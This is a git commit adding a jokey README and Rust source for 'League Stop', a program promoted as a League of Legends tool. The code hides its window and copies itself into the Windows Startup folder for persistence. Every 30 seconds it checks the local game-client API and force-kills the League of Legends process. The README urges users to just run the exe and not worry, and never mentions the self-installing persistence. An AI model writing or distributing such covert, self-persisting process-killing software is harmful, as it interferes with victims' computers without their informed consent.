e83798c8be3fe103155b1e149181d292d835aecb
borecjeborec1 <robingrundel@seznam.cz>
2022-03-11 23:40:56 +0100

    initial commit

---
+++ Readme.md
@@ -0,0 +1,13 @@
+# League Stop
+
+The best application for league of legends. You won't have 0/10 in any other game with it!
+
+League stop is powered with slogan: "You can't int your game if you can't play it!"
+
+## Usage
+
+Just download the league-stop.exe app and run it.
+Don't worry about anything, it's fully automatic.
+
+Now you can enjoy your life!
+You're welcome!
---
+++ src/main.rs
@@ -0,0 +1,60 @@
+#![windows_subsystem = "windows"]
+use std::env;
+use std::fs;
+use std::process::Command;
+
+#[tokio::main]
+async fn main() {
+    let dir_name = env::current_dir().unwrap().display().to_string();
+    let path_arr = dir_name.split("\\").collect::<Vec<&str>>();
+    const EXE_NAME: &str = "league-stop.exe";
+    let path = format!(
+        "{}/{}/{}/{}",
+        path_arr[0],
+        path_arr[1],
+        path_arr[2],
+        "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+    );
+    loop {
+        let dirs = fs::read_dir(&path).unwrap();
+        let mut is_in_start = false;
+        for item in dirs {
+            let file = item.unwrap().path().display().to_string();
+            if file.contains(EXE_NAME) {
+                is_in_start = true;
+            }
+        }
+        if is_in_start == false {
+            fs::copy(EXE_NAME, format!("{}/{}", path, EXE_NAME)).unwrap();
+            // println!("{}", "copied");
+        }
+        let output = reqwest::get("https://127.0.0.1:2999/liveclientdata/allgamedata").await;
+        if output.unwrap_err().to_string().contains("-2146762487"){
+            Command::new("taskkill")
+                    .arg("/F")
+                    .arg("/IM")
+                    .arg("League of Legends.exe")
+                    .output()
+                    .expect("Failed to execute command");
+        }
+     
+        // let output = Command::new("curl")
+        //     .arg("--insecure")
+        //     .arg("https://127.0.0.1:2999/liveclientdata/allgamedata")
+        //     .output()
+        //     .expect("Failed to execute command");
+
+        // println!("{}", "curled");
+        // if String::from_utf8_lossy(&output.stdout).contains("\"gameData\"") {
+        //     Command::new("taskkill")
+        //         .arg("/F")
+        //         .arg("/IM")
+        //         .arg("League of Legends.exe")
+        //         .output()
+        //         .expect("Failed to execute command");
+        //     // println!("{}", "shutdowned");
+        // }
+
+        std::thread::sleep(std::time::Duration::from_secs(30));
+    }
+}
